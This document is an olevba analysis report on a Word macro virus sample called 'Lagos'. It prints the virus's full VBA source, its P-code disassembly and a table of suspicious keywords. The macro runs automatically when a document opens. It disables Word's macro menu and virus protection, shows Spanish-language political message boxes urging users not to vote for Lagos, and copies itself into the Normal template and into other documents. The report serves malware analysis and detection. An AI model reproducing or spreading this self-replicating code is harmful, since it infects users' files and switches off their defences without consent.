olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lagos
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Lagos.cls 
in file: Virus.MSWord.Lagos - OLE stream: 'Macros/VBA/Lagos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
' Proteccion
CommandBars("Tools").Controls("Macro").Enabled = False
Options.VirusProtection = False
' Danno
'If ActiveDocument.VBProject.VBComponents.Item(1).Name <> "Lagos" Then
'    Selection.TypeParagraph
'    For a = 1 To 10
'        Selection.TypeText ("No a Lagos, va a pudrir al país!!!")
'        Selection.TypeParagraph
'    Next a
'endif
Dim boton
boton = vbYesNo + vbCritical + vbDefaultButton2
respuesta = MsgBox("Ud. Vota por Lagos?", boton, "Decida:")
If respuesta = vbYes Then
    MsgBox ("Ud no apoya al pais")
    respuesta3 = vbYes
    While respuesta3 = vbYes
    respuesta2 = MsgBox("Esta seguro de votar por Lagos?", boton, "Pienselo Bien")
    If respuesta2 = vbNo Then
        MsgBox ("Acuerdece de pensarlo bien en la eleccion")
        respuesta3 = vbNo
    Else
        MsgBox ("Dese  cuenta de lo que esta haciendo!!")
    End If
    Wend
Else
    MsgBox ("Ud quiere el desarrollo de Chile")
    
End If
' Copia
Set docum = ActiveDocument.VBProject.VBComponents.Item(1)
Set norma = NormalTemplate.VBProject.VBComponents.Item(1)
nldoc = docum.codemodule.countoflines
nlnorm = norma.codemodule.countoflines
bg = 2
If docum.Name <> "Lagos" Then
    If nldoc > 0 Then
        docum.codemodule.deletelines 1, nldoc
    End If
    Set ainfectar = docum
    adocum = True
    docum.Name = "Lagos"
End If
If norma.Name <> "Lagos" Then
    If nlnorm > 0 Then
        norma.codemodule.deletelines 1, nlnorm
    End If
    Set ainfectar = norma
    anorma = True
    norma.Name = "Lagos"
End If
If anorma <> True And adocum <> True Then GoTo aa
If anorma = True Then
    ainfectar.codemodule.addfromstring ("Private Sub Document_Close()")
    Do While docum.codemodule.lines(bg, 1) <> ""
        ainfectar.codemodule.insertlines bg, docum.codemodule.lines(bg, 1)
        bg = bg + 1
    Loop
End If
If adocum = True Then
    ainfectar.codemodule.addfromstring ("Private Sub Document_Open()")
    Do While norma.codemodule.lines(bg, 1) <> ""
        ainfectar.codemodule.insertlines bg, norma.codemodule.lines(bg, 1)
        bg = bg + 1
    Loop
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ActiveDocument.Saved = True
aa:
' Virus Lagos: Es lo menos que se merece.
' Basado en el virus Melisa
' Autor Joe Fasto
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Lagos
' ===============================================================================
' Module streams:
' Macros/VBA/Lagos - 4806 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	QuoteRem 0x0000 0x000B " Proteccion"
' Line #2:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	QuoteRem 0x0000 0x0006 " Danno"
' Line #5:
' 	QuoteRem 0x0000 0x0045 "If ActiveDocument.VBProject.VBComponents.Item(1).Name <> "Lagos" Then"
' Line #6:
' 	QuoteRem 0x0000 0x001B "    Selection.TypeParagraph"
' Line #7:
' 	QuoteRem 0x0000 0x0013 "    For a = 1 To 10"
' Line #8:
' 	QuoteRem 0x0000 0x0041 "        Selection.TypeText ("No a Lagos, va a pudrir al país!!!")"
' Line #9:
' 	QuoteRem 0x0000 0x001F "        Selection.TypeParagraph"
' Line #10:
' 	QuoteRem 0x0000 0x000A "    Next a"
' Line #11:
' 	QuoteRem 0x0000 0x0005 "endif"
' Line #12:
' 	Dim 
' 	VarDefn boton
' Line #13:
' 	Ld vbYesNo 
' 	Ld vbCritical 
' 	Add 
' 	Ld vbDefaultButton2 
' 	Add 
' 	St boton 
' Line #14:
' 	LitStr 0x0013 "Ud. Vota por Lagos?"
' 	Ld boton 
' 	LitStr 0x0007 "Decida:"
' 	ArgsLd MsgBox 0x0003 
' 	St respuesta 
' Line #15:
' 	Ld respuesta 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #16:
' 	LitStr 0x0013 "Ud no apoya al pais"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #17:
' 	Ld vbYes 
' 	St respuesta3 
' Line #18:
' 	Ld respuesta3 
' 	Ld vbYes 
' 	Eq 
' 	While 
' Line #19:
' 	LitStr 0x001F "Esta seguro de votar por Lagos?"
' 	Ld boton 
' 	LitStr 0x000D "Pienselo Bien"
' 	ArgsLd MsgBox 0x0003 
' 	St respuesta2 
' Line #20:
' 	Ld respuesta2 
' 	Ld vbNo 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	LitStr 0x0029 "Acuerdece de pensarlo bien en la eleccion"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #22:
' 	Ld vbNo 
' 	St respuesta3 
' Line #23:
' 	ElseBlock 
' Line #24:
' 	LitStr 0x0026 "Dese  cuenta de lo que esta haciendo!!"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Wend 
' Line #27:
' 	ElseBlock 
' Line #28:
' 	LitStr 0x0020 "Ud quiere el desarrollo de Chile"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #29:
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	QuoteRem 0x0000 0x0006 " Copia"
' Line #32:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set docum 
' Line #33:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set norma 
' Line #34:
' 	Ld docum 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St nldoc 
' Line #35:
' 	Ld norma 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St nlnorm 
' Line #36:
' 	LitDI2 0x0002 
' 	St bg 
' Line #37:
' 	Ld docum 
' 	MemLd New 
' 	LitStr 0x0005 "Lagos"
' 	Ne 
' 	IfBlock 
' Line #38:
' 	Ld nldoc 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #39:
' 	LitDI2 0x0001 
' 	Ld nldoc 
' 	Ld docum 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	SetStmt 
' 	Ld docum 
' 	Set ainfectar 
' Line #42:
' 	LitVarSpecial (True)
' 	St adocum 
' Line #43:
' 	LitStr 0x0005 "Lagos"
' 	Ld docum 
' 	MemSt New 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld norma 
' 	MemLd New 
' 	LitStr 0x0005 "Lagos"
' 	Ne 
' 	IfBlock 
' Line #46:
' 	Ld nlnorm 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #47:
' 	LitDI2 0x0001 
' 	Ld nlnorm 
' 	Ld norma 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	SetStmt 
' 	Ld norma 
' 	Set ainfectar 
' Line #50:
' 	LitVarSpecial (True)
' 	St anorma 
' Line #51:
' 	LitStr 0x0005 "Lagos"
' 	Ld norma 
' 	MemSt New 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Ld anorma 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld adocum 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo aa 
' 	EndIf 
' Line #54:
' 	Ld anorma 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #55:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Paren 
' 	Ld ainfectar 
' 	MemLd codemodule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #56:
' 	Ld bg 
' 	LitDI2 0x0001 
' 	Ld docum 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #57:
' 	Ld bg 
' 	Ld bg 
' 	LitDI2 0x0001 
' 	Ld docum 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	Ld ainfectar 
' 	MemLd codemodule 
' 	ArgsMemCall insertlines 0x0002 
' Line #58:
' 	Ld bg 
' 	LitDI2 0x0001 
' 	Add 
' 	St bg 
' Line #59:
' 	Loop 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Ld adocum 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #62:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Paren 
' 	Ld ainfectar 
' 	MemLd codemodule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #63:
' 	Ld bg 
' 	LitDI2 0x0001 
' 	Ld norma 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #64:
' 	Ld bg 
' 	Ld bg 
' 	LitDI2 0x0001 
' 	Ld norma 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	Ld ainfectar 
' 	MemLd codemodule 
' 	ArgsMemCall insertlines 0x0002 
' Line #65:
' 	Ld bg 
' 	LitDI2 0x0001 
' 	Add 
' 	St bg 
' Line #66:
' 	Loop 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #69:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #70:
' 	Label aa 
' Line #71:
' 	QuoteRem 0x0000 0x0028 " Virus Lagos: Es lo menos que se merece."
' Line #72:
' 	QuoteRem 0x0000 0x001A " Basado en el virus Melisa"
' Line #73:
' 	QuoteRem 0x0000 0x0010 " Autor Joe Fasto"
' Line #74:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

